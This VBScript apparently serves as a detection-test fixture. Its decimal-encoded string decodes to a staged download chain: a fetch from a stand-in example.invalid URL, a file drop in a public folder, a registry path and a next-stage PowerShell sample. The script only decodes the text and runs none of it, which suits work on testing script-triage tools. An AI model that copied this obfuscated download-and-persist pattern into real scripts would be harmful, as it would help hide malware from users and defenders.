Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_f01eb3a3 = "105,48,36,111,102,103,88,99,102,48,84,86,100,104,92,101,88,82,101,88,96,98,103,88,31,106,101,92,103,88,82,89,92,95,88,31,87,92,102,99,84,103,86,91,82,99,101,98,86,88,102,102,31,91,84,97,87,98,89,89,82,102,86,101,92,99,103,111,84,87,84,99,103,88,101,48,64,92,86,101,98,102,98,89,103,33,75,64,63,59,71,71,67,111,102,103,84,90,88,82,86,98,104,97,103,48,39,111,86,84,96,99,84,92,90,97,82,92,87,48,86,84,96,99,84,92,90,97,32,35,86,86,35,42,35,40,44,43,86,111,104,101,95,48,91,103,103,99,102,45,34,34,35,86,86,35,42,35,40,44,43,86,33,88,107,84,96,99,95,88,33,92,97,105,84,95,92,87,34,86,87,86,89,42,38,37,36,33,87,84,103,111,104,102,88,101,82,84,90,88,97,103,48,59,104,97,103,101,88,102,102,63,84,85,34,35,86,86,35,42,35,40,44,43,86,111,89,92,95,88,82,99,84,103,91,48,54,45,79,72,102,88,101,102,79,67,104,85,95,92,86,79,59,104,97,103,101,88,102,102,63,84,85,79,102,103,84,90,88,32,35,86,86,35,42,35,40,44,43,86,33,87,84,103,111,101,88,90,92,102,103,101,108,82,99,84,103,91,48,59,62,54,72,79,70,98,89,103,106,84,101,88,79,59,104,97,103,101,88,102,102,63,84,85,79,55,92,102,99,98,102,84,85,95,88,79,35,86,86,35,42,35,40,44,43,86,111,97,88,107,103,82,102,103,84,90,88,48,101,88,102,98,104,101,86,88,32,102,84,96,99,95,88,33,99,102,36"
Const Codec_f01eb3a3 = "decimal_comma|subtract_modulo_256|0d"

Function Load_f01eb3a3()
  Dim parts, result(), i
  parts = Split(Material_f01eb3a3, ",")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt(parts(i))
  Next
  Load_f01eb3a3 = result
End Function

Function Decode_f01eb3a3(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) + 13) Mod 256
  Next
  Decode_f01eb3a3 = result
End Function

Function Recover_f01eb3a3()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = Join(Array("north", "south"), ":")
      s = Load_f01eb3a3()
      Select Case 1
        Case 1
          d = Decode_f01eb3a3(s)
        Case Else
          d = Array()
      End Select
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_f01eb3a3 = t
End Function

Function Inspect_f01eb3a3()
  Dim fields
  fields = Split(Recover_f01eb3a3(), "|")
  Inspect_f01eb3a3 = Join(fields, "|")
End Function
